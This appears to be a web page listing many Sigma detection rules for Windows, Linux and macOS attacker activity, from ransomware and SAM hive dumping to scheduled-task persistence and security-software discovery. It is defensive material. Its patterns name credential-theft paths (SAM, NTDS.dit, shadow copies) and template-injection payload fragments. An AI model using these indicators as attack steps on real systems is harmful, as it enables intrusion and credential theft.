<li><a href="#">title:Ryuk Ransomware id: 0acaad27-9f02-4136-a243-c357202edd74 status: stable description: Detects Ryuk Ransomware command lines author: Vasiliy Burov references: - date: 2019/08/06 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - '\net.exe' - '\net1.exe' CommandLine|contains: 'stop' selection2: CommandLine|contains: - 'samss' - 'audioendpointbuilder' - 'unistoresvc_?????' condition: all of selection* falsepositives: - Unlikely level: critical tags: - attack.execution - attack.t1204 
<li><a href="#">title:Ryuk Ransomware id: c37510b8-2107-4b78-aa32-72f251e7a844 status: stable description: Detects Ryuk ransomware activity author: Florian Roth references: - date: 2019/12/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'Microsoft\Windows\CurrentVersion\Run' - 'C:\users\Public\' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: high tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:SAM Dump File Creation id: 4e87b8e2-2ee9-4b2a-a715-4727d297ece0 description: Detects the creation of files that look like exports of the local SAM (Security Account Manager) status: experimental author: Florian Roth references: - - - - - date: 2022/02/11 tags: - attack.credential_access - attack.t1003.002 logsource: product: windows category: file_event detection: selection: - TargetFilename|endswith: - '\Temp\sam' - '\sam.sav' - '\Intel\sam' - '\sam.hive' - '\Perflogs\sam' - '\ProgramData\sam' - '\Users\Public\sam' - '\AppData\Local\sam' - '\AppData\Roaming\sam' - '_ShadowSteal.zip' # - '\Documents\SAM.export' # - TargetFilename: 'c:\sam' - TargetFilename|contains: - '\hive_sam_' # - '\sam.save' - '\sam.export' - '\~reg_sam.save' - '\sam_backup' - '\sam.bck' - '\sam.backup' condition: selection falsepositives: - Rare cases of administrative activity level: high 
<li><a href="#">title:SAM Dump to AppData id: 839dd1e8-eda8-4834-8145-01beeee33acd status: test description: Detects suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers author: Florian Roth date: 2018/01/27 modified: 2022/04/14 logsource: product: windows service: system definition: The source of this type of event is Kernel-General detection: selection: Provider_Name: Microsoft-Windows-Kernel-General EventID: 16 keywords: - '\AppData\Local\Temp\SAM-' - '.dmp' condition: selection and all of keywords falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1003.002 
<li><a href="#">title:SAM Registry Hive Handle Request id: f8748f2c-89dc-4d95-afb0-5a2dfdbad332 status: test description: Detects handles requested to SAM registry hive author: Roberto Rodriguez @Cyb3rWard0g references: - date: 2019/08/12 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4656 ObjectType: 'Key' ObjectName|endswith: '\SAM' condition: selection fields: - ComputerName - SubjectDomainName - SubjectUserName - ProcessName - ObjectName falsepositives: - Unknown level: high tags: - attack.discovery - attack.t1012 - attack.credential_access - attack.t1552.002 
<li><a href="#">title:Scanner PoC for CVE-2019-0708 RDP RCE Vuln id: 8400629e-79a9-4737-b387-5db940ab2367 description: Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable to CVE-2019-0708 RDP RCE aka BlueKeep status: experimental references: - - tags: - attack.lateral_movement - attack.t1210 - car.2013-07-002 author: Florian Roth (rule), Adam Bradbury (idea) date: 2019/06/02 modified: 2021/11/12 logsource: product: windows service: security detection: selection: EventID: 4625 TargetUserName: AAAAAAA condition: selection falsepositives: - Unlikely level: high 
<li><a href="#">title:Scheduled Cron Task/Job id: 6b14bac8-3e3a-4324-8109-42f0546a347f status: test description: Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder. author: Alejandro Ortuno, oscd.community references: - date: 2020/10/06 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection: Image|endswith: 'crontab' CommandLine|contains: '/tmp/' condition: selection falsepositives: - Legitimate administration activities level: medium tags: - attack.execution - attack.persistence - attack.privilege_escalation - attack.t1053.003 
<li><a href="#">title:Scheduled Cron Task/Job id: 7c3b43d8-d794-47d2-800a-d277715aa460 status: test description: Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder. author: Alejandro Ortuno, oscd.community references: - date: 2020/10/06 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image|endswith: '/crontab' CommandLine|contains: '/tmp/' condition: selection falsepositives: - Legitimate administration activities level: medium tags: - attack.execution - attack.persistence - attack.privilege_escalation - attack.t1053.003 
<li><a href="#">title:Scheduled Task Creation id: 92626ddd-662c-49e3-ac59-f6535f12d189 status: experimental description: Detects the creation of scheduled tasks in user session author: Florian Roth date: 2019/01/16 modified: 2021/08/26 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\schtasks.exe' CommandLine|contains: ' /create ' filter: User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' condition: selection and not filter fields: - CommandLine - ParentCommandLine tags: - attack.execution - attack.persistence - attack.privilege_escalation - attack.t1053.005 - attack.s0111 - car.2013-08-001 falsepositives: - Administrative activity - Software installation level: low 
<li><a href="#">title:Scheduled Task Deletion id: 4f86b304-3e02-40e3-aa5d-e88a167c9617 description: Detects scheduled task deletion events. Scheduled tasks are likely to be deleted if not used for persistence. Malicious Software often creates tasks directly under the root node e.g. \TASKNAME status: experimental author: David Strassegger, Tim Shelton date: 2021/01/22 modified: 2022/05/16 tags: - attack.execution - attack.privilege_escalation - car.2013-08-001 - attack.t1053.005 references: - - logsource: product: windows service: security definition: 'The Advanced Audit Policy setting Object Access > Audit Other Object Access Events has to be configured to allow this detection. We also recommend extracting the Command field from the embedded XML in the event data.' detection: selection: EventID: 4699 falsepositive1: TaskName: '\Microsoft\Windows\RemovalTools\MRT_ERROR_HB' # triggered by ParentCommandLine=C:\WINDOWS\system32\MRT.exe /EHB /HeartbeatFailure ErrorStack,Previous=ErrorStack,Previous=ErrorStack,Previous=ErrorStack,Previous=ErrorStack,Previous=SubmitHeartbeatReportData,Hr=0x80072f8f,Hr=0x80072f8f,Hr=0x80072f8f,Hr=0x80072f8f,Hr=0x80072f8f /HeartbeatError 0x80072f8f condition: selection and not 1 of falsepositive* falsepositives: - Software installation level: low 
<li><a href="#">title:Scheduled Task Executing Powershell Encoded Payload from Registry id: c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78 status: experimental description: Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell. author: '@Kostastsale, @TheDFIRReport, slightly modified by pH-T' references: - date: 2022/02/12 modified: 2022/03/15 logsource: product: windows category: process_creation detection: selection1: Image|endswith: '\schtasks.exe' CommandLine|contains|all: - '/Create' - '/SC' - 'FromBase64String' - 'Get-ItemProperty' selection2: CommandLine|contains: - 'HKCU:' - 'HKLM:' - 'registry::' - 'HKEY_' condition: selection1 and selection2 falsepositives: - Unknown level: high tags: - attack.execution - attack.persistence - attack.t1053.005 - attack.t1059.001 
<li><a href="#">title:Scheduled Task WScript VBScript id: e1118a8f-82f5-44b3-bb6b-8a284e5df602 status: experimental description: Detects specific process parameters as used by ACTINIUM scheduled task persistence creation. author: Andreas Hunkeler (@Karneades) references: - date: 2022/02/07 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'schtasks' - 'create' - 'wscript' - 'e:vbscript' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: high tags: - attack.persistence - attack.t1053 - attack.t1053.005 
<li><a href="#">title:Scheduled Task/Job At id: d2d642d7-b393-43fe-bae4-e81ed5915c4b status: stable description: Detects the use of at/atd author: Ã–mer GÃ¼nal, oscd.community date: 2020/10/06 references: - logsource: product: linux category: process_creation detection: selection: Image|endswith: - '/at' - '/atd' condition: selection falsepositives: - Legitimate administration activities level: low tags: - attack.persistence - attack.t1053.002 
<li><a href="#">title:Scheduled TaskCache Change by Uncommon Program id: 4720b7df-40c3-48fd-bbdf-fd4b3c464f0d description: Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious status: experimental date: 2021/06/18 modified: 2022/05/23 references: - - author: Syed Hasan (@syedhasan009) logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\' filter: TargetObject|contains: - 'Microsoft\Windows\UpdateOrchestrator' - 'Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask\Index' - 'Microsoft\Windows\Flighting\OneSettings\RefreshCache\Index' filter_tiworker: Image|startswith: 'C:\Windows\' Image|endswith: '\TiWorker.exe' TargetObject|contains: '\MICROSOFT\WINDOWS NT\CURRENTVERSION\SCHEDULE\TASKCACHE\PLAIN\{1A552422-F571-4376-A7F1-5941E63D7B40}' filter_svchost: Image: 'C:\WINDOWS\system32\svchost.exe' condition: selection and not 1 of filter* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1053 - attack.t1053.005 
<li><a href="#">title:Schtasks From Suspicious Folders id: 8a8379b8-780b-4dbf-b1e9-31c8d112fefb description: Detects scheduled task creations that have suspicious action command and folder combinations status: experimental references: - tags: - attack.execution - attack.t1053.005 author: Florian Roth date: 2022/04/15 logsource: product: windows category: process_creation detection: selection_create: Image|endswith: '\schtasks.exe' CommandLine|contains: ' /create ' selection_command: CommandLine|contains: - 'powershell' - 'cmd /c ' - 'cmd.exe /c ' selection1_all_folders: CommandLine|contains: - 'C:\ProgramData\' - '%ProgramData%' condition: all of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:SCM Database Handle Failure id: 13addce7-47b2-4ca0-a98f-1de964d1d669 description: Detects non-system users failing to get a handle of the SCM database. status: experimental date: 2019/08/12 modified: 2021/11/12 author: Roberto Rodriguez @Cyb3rWard0g references: - tags: - attack.discovery - attack.t1010 logsource: product: windows service: security detection: selection: EventID: 4656 ObjectType: 'SC_MANAGER OBJECT' ObjectName: 'ServicesActive' #Keywords: 'Audit Failure' <-> in the ref 'Keywords':-9214364837600034816 filter: SubjectLogonId: '0x3e4' condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:SCM Database Privileged Operation id: dae8171c-5ec6-4396-b210-8466585b53e9 status: test description: Detects non-system users performing privileged operation os the SCM database author: Roberto Rodriguez @Cyb3rWard0g, Tim Shelton references: - date: 2019/08/15 modified: 2022/06/30 logsource: product: windows service: security detection: selection: EventID: 4674 ObjectType: 'SC_MANAGER OBJECT' ObjectName: 'servicesactive' PrivilegeList: 'SeTakeOwnershipPrivilege' filter: SubjectLogonId: '0x3e4' ProcessName|endswith: ':\Windows\System32\services.exe' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1548 
<li><a href="#">title:SCR File Write Event id: c048f047-7e2a-4888-b302-55f509d4a91d status: experimental description: An attacker may execute an application as a .SCR File (Screensaver) using rundll32.exe desk.cpl,InstallScreenSaver author: 'Christopher Peacock @securepeacock, SCYTHE @scythe_io' references: - date: 2022/04/27 tags: - attack.t1218.011 - attack.defense_evasion logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: '.scr' filter: TargetFilename|startswith: - 'C:\Windows\System32\' - 'C:\Windows\system32\' - 'C:\Windows\SysWOW64\' - 'C:\Windows\SysWow64\' - 'C:\Windows\winsxs\' - 'C:\Windows\WinSxS\' condition: selection and not filter falsepositives: - The installation of new screen savers. level: medium 
<li><a href="#">title:Screen Capture - macOS id: 0877ed01-da46-4c49-8476-d49cdd80dfa7 status: test description: Detects attempts to use screencapture to collect macOS screenshots author: remotephone, oscd.community references: - - date: 2020/10/13 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection: Image: '/usr/sbin/screencapture' condition: selection falsepositives: - Legitimate user activity taking screenshots level: low tags: - attack.collection - attack.t1113 
<li><a href="#">title:Screen Capture with Import Tool id: dbe4b9c5-c254-4258-9688-d6af0b7967fd description: Detects adversary creating screen capture of a desktop with Import Tool. Highly recommended using rule on servers, due to high usage of screenshot utilities on user workstations. ImageMagick must be installed. author: 'Pawel Mazur' status: experimental date: 2021/09/21 references: - - - - logsource: product: linux service: auditd detection: import: type: EXECVE a0: import import_window_root: a1: '-window' a2: 'root' a3|endswith: - '.png' - '.jpg' - '.jpeg' import_no_window_root: a1|endswith: - '.png' - '.jpg' - '.jpeg' condition: import and (import_window_root or import_no_window_root) tags: - attack.collection - attack.t1113 falsepositives: - Legitimate use of screenshot utility level: low 
<li><a href="#">title:Screen Capture with Xwd id: e2f17c5d-b02a-442b-9052-6eb89c9fec9c description: Detects adversary creating screen capture of a full with xwd. Highly recommended using rule on servers, due high usage of screenshot utilities on user workstations author: 'Pawel Mazur' status: experimental date: 2021/09/13 references: - - - logsource: product: linux service: auditd detection: xwd: type: EXECVE a0: xwd xwd_root_window: a1: '-root' a2: '-out' a3|endswith: '.xwd' xwd_no_root_window: a1: '-out' a2|endswith: '.xwd' condition: xwd and (xwd_root_window or xwd_no_root_window) tags: - attack.collection - attack.t1113 falsepositives: - Legitimate use of screenshot utility level: low 
<li><a href="#">title:ScreenConnect Backstage Mode Anomaly id: 7b582f1a-b318-4c6a-bf4e-66fe49bf55a5 description: Detects suspicious sub processes started by the ScreenConnect client service, which indicates the use of the so-called Backstage mode status: experimental references: - - tags: - attack.command_and_control - attack.t1219 author: Florian Roth date: 2022/02/25 logsource: product: windows category: process_creation detection: selection: ParentImage|endswith: 'ScreenConnect.ClientService.exe' Image|endswith: - '\cmd.exe' - '\powershell.exe' condition: selection falsepositives: - Case in which administrators are allowed to use ScreenConnect's Backstage mode level: high 
<li><a href="#">title:ScreenConnect Remote Access id: 75bfe6e6-cd8e-429e-91d3-03921e1d7962 status: experimental description: Detects ScreenConnect program starts that establish a remote access to that system (not meeting, not remote support) references: - author: Florian Roth date: 2021/02/11 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'e=Access&' - 'y=Guest&' - '&p=' - '&c=' - '&k=' condition: selection falsepositives: - Legitimate use by administrative staff level: high tags: - attack.initial_access - attack.t1133 
<li><a href="#">title:ScreenConnect Temporary Installation Artefact id: fec96f39-988b-4586-b746-b93d59fd1922 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: frack113 date: 2022/02/13 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: '\Bin\ScreenConnect.' #pattern to dll and jar file condition: selection falsepositives: - Legitimate use level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:ScreenSaver Registry Key Set id: 40b6e656-4e11-4c0c-8772-c1cc6dae34ce description: Detects registry key established after masqueraded .scr file execution using Rundll32 through desk.cpl status: experimental date: 2022/05/04 modified: 2022/05/04 author: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk) references: - - - logsource: product: windows category: registry_set detection: selection: EventType: SetValue Image|endswith: '\rundll32.exe' registry: TargetObject|contains: '\Control Panel\Desktop\SCRNSAVE.EXE' Details|endswith: '.scr' filter: Details|contains: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' condition: selection and registry and not filter falsepositives: - Legitimate use of screen saver level: medium tags: - attack.defense_evasion - attack.t1218.011 
<li><a href="#">title:Script Event Consumer Spawning Process id: f6d1dd2f-b8ce-40ca-bc23-062efb686b34 status: experimental description: Detects a suspicious child process of Script Event Consumer (scrcons.exe). references: - - author: Sittikorn S date: 2021/06/21 tags: - attack.execution - attack.t1047 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\scrcons.exe' Image|endswith: - '\svchost.exe' - '\dllhost.exe' - '\powershell.exe' - '\wscript.exe' - '\cscript.exe' - '\schtasks.exe' - '\regsvr32.exe' - '\mshta.exe' - '\rundll32.exe' - '\msiexec.exe' - '\msbuild.exe' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Script Interpreter Execution From Suspicious Folder id: 1228c958-e64e-4e71-92ad-7d429f4138ba description: Detects a suspicious script executions in temporary folders or folders accessible by environment variables status: experimental references: - author: Florian Roth date: 2022/02/08 tags: - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection_image: Image|endswith: - '\powershell.exe' - '\mshta.exe' - '\wscript.exe' - '\cscript.exe' - '\cmd.exe' selection_flags: CommandLine|contains: - ' -w hidden ' - ' -ep bypass ' - '/e:vbscript ' - '/e:javascript ' selection_original: OriginalFileName: - 'powershell.exe' - 'mshta.exe' - 'wscript.exe' - 'cscript.exe' - 'cmd.exe' folders: Image|contains: - '\Windows\Temp' - '\Temporary Internet' - '\AppData\Local\Temp' - '\AppData\Roaming\Temp' - 'C:\Users\Public\' - 'C:\Perflogs\' condition: 1 of selection* and folders falsepositives: - Unknown level: high 
<li><a href="#">title:Scripted Diagnostics Turn Off Check Enabled - Registry id: 7d995e63-ec83-4aa3-89d5-8a17b5c87c86 description: Detects enabling TurnOffCheck which can be used to bypass defense of MSDT Follina vulnerability date: 2022/06/15 author: 'Christopher Peacock @securepeacock, SCYTHE @scythe_io' references: - status: experimental logsource: product: windows category: registry_set detection: selection: EventType: SetValue TargetObject: 'HKLM\SOFTWARE\Policies\Microsoft\Windows\ScriptedDiagnostics\TurnOffCheck' Details: 'DWORD (0x00000001)' condition: selection falsepositives: - Administrator actions level: medium tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Sdclt Child Processes id: da2738f2-fadb-4394-afa7-0a0674885afa status: test description: A General detection for sdclt spawning new processes. This could be an indicator of sdclt being used for bypass UAC techniques. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - date: 2020/05/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\sdclt.exe' condition: selection falsepositives: - Unknown level: medium tags: - attack.privilege_escalation - attack.t1548.002 
<li><a href="#">title:Sdiagnhost Calling Suspicious Child Process id: f3d39c45-de1a-4486-a687-ab126124f744 status: experimental description: Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190) author: Nextron Systems references: - - date: 2022/06/01 tags: - attack.defense_evasion - attack.t1036 - attack.t1218 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\sdiagnhost.exe' Image|endswith: - '\powershell.exe' - '\cmd.exe' - '\mshta.exe' - '\cscript.exe' - '\wscript.exe' - '\taskkill.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Secure Deletion with SDelete id: 39a80702-d7ca-4a83-b776-525b1f86a36d status: test description: Detects renaming of file while deletion with SDelete tool. author: Thomas Patzke references: - - - date: 2017/06/14 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 4656 - 4663 - 4658 ObjectName|endswith: - '.AAA' - '.ZZZ' condition: selection falsepositives: - Legitimate usage of SDelete level: medium tags: - attack.impact - attack.defense_evasion - attack.t1070.004 - attack.t1027.005 - attack.t1485 - attack.t1553.002 - attack.s0195 
<li><a href="#">title:Security Event Log Cleared id: a122ac13-daf8-4175-83a2-72c387be339d status: experimental description: Checks for event id 1102 which indicates the security event log was cleared. references: - date: 2021/08/15 modified: 2021/10/13 author: Saw Winn Naung level: medium logsource: service: security product: windows tags: - attack.t1070.001 detection: selection: EventID: 1102 Provider_Name: Microsoft-Windows-Eventlog condition: selection fields: - SubjectLogonId - SubjectUserName - SubjectUserSid - SubjectDomainName falsepositives: - Legitimate administrative activity 
<li><a href="#">title:Security Eventlog Cleared id: d99b79d2-0a6f-4f46-ad8b-260b6e17f982 related: - id: f2f01843-e7b8-4f95-a35a-d23584476423 type: obsoletes description: One of the Windows Eventlogs has been cleared. e.g. caused by "wevtutil cl" command execution status: experimental references: - - author: Florian Roth date: 2017/01/10 modified: 2022/02/24 tags: - attack.defense_evasion - attack.t1070.001 - car.2016-04-002 logsource: product: windows service: security detection: selection_517: EventID: 517 Provider_Name: Security selection_1102: EventID: 1102 Provider_Name: Microsoft-Windows-Eventlog condition: 1 of selection_* falsepositives: - Rollout of log collection agents (the setup routine often includes a reset of the local Eventlog) - System provisioning (system reset before the golden image creation) level: high 
<li><a href="#">title:Security Software Discovery by Powershell id: 904e8e61-8edf-4350-b59c-b905fc8e810c status: experimental author: frack113 date: 2021/12/16 description: | Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-viru references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_1: ScriptBlockText|contains|all: - 'get-process' - '.Description' - '-like' selection_2: ScriptBlockText|contains: - '"*virus*"' - '"*carbonblack*"' - '"*defender*"' - '"*cylance*"' condition: all of selection_* falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1518.001 
<li><a href="#">title:Security Software Discovery id: 0ed75b9c-c73b-424d-9e7d-496cd565fbe0 status: test description: Detects usage of system utilities (only grep for now) to discover security software discovery author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: grep_execution: Image: '/usr/bin/grep' security_services_and_processes: CommandLine|contains: - 'nessusd' # nessus vulnerability scanner - 'santad' # google santa - 'CbDefense' # carbon black - 'falcond' # crowdstrike falcon - 'td-agent' # fluentd log shipper - 'packetbeat' # elastic network logger/shipper - 'filebeat' # elastic log file shipper - 'auditbeat' # elastic auditing agent/log shipper - 'osqueryd' # facebook osquery - 'BlockBlock' # Objective-See persistence locations watcher/blocker - 'LuLu' # Objective-See firewall management utility little_snitch_process: # Objective Development Software firewall management utility CommandLine|contains|all: - 'Little' - 'Snitch' condition: grep_execution and security_services_and_processes or grep_execution and little_snitch_process falsepositives: - Legitimate activities level: medium tags: - attack.discovery - attack.t1518.001 
<li><a href="#">title:Security Software Discovery id: c9d8b7fd-78e4-44fe-88f6-599135d46d60 status: test description: Detects usage of system utilities (only grep for now) to discover security software discovery author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: linux detection: grep_execution: Image|endswith: '/grep' security_services_and_processes: CommandLine|contains: - 'nessusd' # nessus vulnerability scanner - 'td-agent' # fluentd log shipper - 'packetbeat' # elastic network logger/shipper - 'filebeat' # elastic log file shipper - 'auditbeat' # elastic auditing agent/log shipper - 'osqueryd' # facebook osquery - 'cbagentd' # carbon black - 'falcond' # crowdstrike falcon condition: grep_execution and security_services_and_processes falsepositives: - Legitimate activities level: low tags: - attack.discovery - attack.t1518.001 
<li><a href="#">title:Security Support Provider (SSP) Added to LSA Configuration id: eeb30123-9fbd-4ee8-aaa0-2e545bbed6dc status: test description: Detects the addition of a SSP to the registry. Upon a reboot or API call, SSP DLLs gain access to encrypted and plaintext passwords stored in Windows. author: iwillkeepwatch references: - - date: 2019/01/18 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection_registry: TargetObject: - 'HKLM\System\CurrentControlSet\Control\Lsa\Security Packages' - 'HKLM\System\CurrentControlSet\Control\Lsa\OSConfig\Security Packages' exclusion_images: - Image: C:\Windows\system32\msiexec.exe - Image: C:\Windows\syswow64\MsiExec.exe condition: selection_registry and not exclusion_images falsepositives: - Unlikely level: critical tags: - attack.persistence - attack.t1547.005 
<li><a href="#">title:SecurityXploded Tool id: 7679d464-4f74-45e2-9e01-ac66c5eb041a description: Detects the execution of SecurityXploded Tools status: stable author: Florian Roth references: - - date: 2018/12/19 modified: 2021/05/11 tags: - attack.credential_access - attack.t1555 logsource: category: process_creation product: windows detection: selection1: Company: SecurityXploded selection2: Image|endswith: 'PasswordDump.exe' selection3: OriginalFileName|endswith: 'PasswordDump.exe' condition: 1 of selection* falsepositives: - Unlikely level: critical 
<li><a href="#">title:Sensitive Registry Access via Volume Shadow Copy id: f57f8d16-1f39-4dcb-a604-6c73d9b54b3d description: Detects a command that accesses password storing registry hives via volume shadow backups author: Max Altgelt, Tobias Michalski date: 2021/08/09 modified: 2021/12/02 status: experimental references: - - logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains: '\\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy' selection_2: CommandLine|contains: - '\\NTDS.dit' - '\\SYSTEM' - '\\SECURITY' - 'C:\\tmp\\log' condition: all of selection* falsepositives: - Some rare backup scenarios level: medium tags: - attack.impact - attack.t1490 
<li><a href="#">title:Server Side Template Injection Strings id: ada3bc4f-f0fd-42b9-ba91-e105e8af7342 status: experimental description: Detects SSTI attempts sent via GET requests in access logs author: Nasreddine Bencherchali date: 2022/06/14 references: - - logsource: category: webserver detection: select_method: cs-method: 'GET' keywords: - '={{' - '=%7B%7B' - '=${' - '=$%7B' - '=<%=' - '=%3C%25=' - '=@(' - 'freemarker.template.utility.Execute' - .getClass().forName('javax.script.ScriptEngineManager') - 'T(org.apache.commons.io.IOUtils)' filter: sc-status: 404 condition: select_method and keywords and not filter falsepositives: - User searches in search boxes of the respective website - Internal vulnerability scanners can cause some serious FPs when used, if you experience a lot of FPs due to this think of adding more filters such as "User Agent" strings and more response codes level: high 
<li><a href="#">title:Service Binary in Suspicious Folder id: a07f0359-4c90-4dc4-a681-8ffea40b4f47 description: Detect the creation of a service with a service binary located in a suspicious directory status: experimental date: 2022/05/02 author: Florian Roth references: - logsource: category: registry_set product: windows detection: selection_1: EventType: SetValue TargetObject|startswith: 'HKLM\System\CurrentControlSet\Services\' TargetObject|endswith: '\Start' Image|contains: - '\Users\Public\' - '\Perflogs\' - '\ADMIN$\' Details: - 'DWORD (0x00000000)' # boot - 'DWORD (0x00000001)' # System - 'DWORD (0x00000002)' # Automatic # 3 - Manual , 4 - Disabled selection_2: EventType: SetValue TargetObject|startswith: 'HKLM\System\CurrentControlSet\Services\' TargetObject|endswith: '\ImagePath' Details|contains: - '\Users\Public\' - '\Perflogs\' - '\ADMIN$\' condition: 1 of selection_* falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Service Binary in Temp Folder id: c0abc838-36b0-47c9-b3b3-a90c39455382 description: Detect the creation of a service with a service binary located in a temporary directory status: experimental date: 2022/05/01 author: frack113 references: - logsource: category: registry_set product: windows detection: selection_1: EventType: SetValue TargetObject|startswith: 'HKLM\System\CurrentControlSet\Services\' TargetObject|endswith: '\Start' Image|contains: '\Temp\' Details: - 'DWORD (0x00000000)' # boot - 'DWORD (0x00000001)' # System - 'DWORD (0x00000002)' # Automatic # 3 - Manual , 4 - Disabled selection_2: EventType: SetValue TargetObject|startswith: 'HKLM\System\CurrentControlSet\Services\' TargetObject|endswith: '\ImagePath' Details|contains: '\Temp\' condition: 1 of selection_* falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Service Binary in Uncommon Folder id: 277dc340-0540-42e7-8efb-5ff460045e07 description: Detect the creation of a service with a service binary located in a uncommon directory status: experimental date: 2022/05/02 modified: 2022/05/04 author: Florian Roth references: - logsource: category: registry_set product: windows detection: selection_1: EventType: SetValue TargetObject|startswith: 'HKLM\System\CurrentControlSet\Services\' TargetObject|endswith: '\Start' Image|contains: - '\AppData\Local\' - '\AppData\Roaming\' Details: - 'DWORD (0x00000000)' # boot - 'DWORD (0x00000001)' # System - 'DWORD (0x00000002)' # Automatic # 3 - Manual , 4 - Disabled selection_2: EventType: SetValue TargetObject|startswith: 'HKLM\System\CurrentControlSet\Services\' TargetObject|endswith: '\ImagePath' Details|contains: - '\AppData\Local\' - '\AppData\Roaming\' filter: - Image|contains: - '\AppData\Roaming\Zoom' - '\AppData\Local\Zoom' - Details|contains: - '\AppData\Roaming\Zoom' - '\AppData\Local\Zoom' condition: 1 of selection_* and not filter falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Service Execution id: 2a072a96-a086-49fa-bcb5-15cc5a619093 status: test description: Detects manual service execution (start) via system utilities. author: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community references: - date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\net.exe' - '\net1.exe' CommandLine|contains: ' start ' # space character after the 'start' keyword indicates that a service name follows, in contrast to `net start` discovery expression condition: selection falsepositives: - Legitimate administrator or user executes a service for legitimate reasons. level: low tags: - attack.execution - attack.t1569.002 
<li><a href="#">title:Service ImagePath Change with Reg.exe id: 9b0b7ac3-6223-47aa-a3fd-e8f211e637db status: experimental description: | Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start. Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services references: - author: frack113 date: 2021/12/30 modified: 2022/03/29 logsource: category: process_creation product: windows detection: selection: Image|endswith: \reg.exe CommandLine|contains|all: - 'add ' - 'SYSTEM\CurrentControlSet\Services\' - ' ImagePath ' selection_value: CommandLine|contains: - ' /d ' - ' -d ' condition: all of selection* falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1574.011 
<li><a href="#">title:Service Installation in Suspicious Folder id: 5e993621-67d4-488a-b9ae-b420d08b96cb status: experimental description: Detects service installation in suspicious folder appdata author: pH-T date: 2022/03/18 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 suspicious1: ImagePath|contains: - '\AppData\' - '\\\\127.0.0.1' - '\\\\localhost' condition: selection and 1 of suspicious* falsepositives: - Unknown level: medium tags: - attack.persistence - attack.privilege_escalation - car.2013-09-005 - attack.t1543.003 
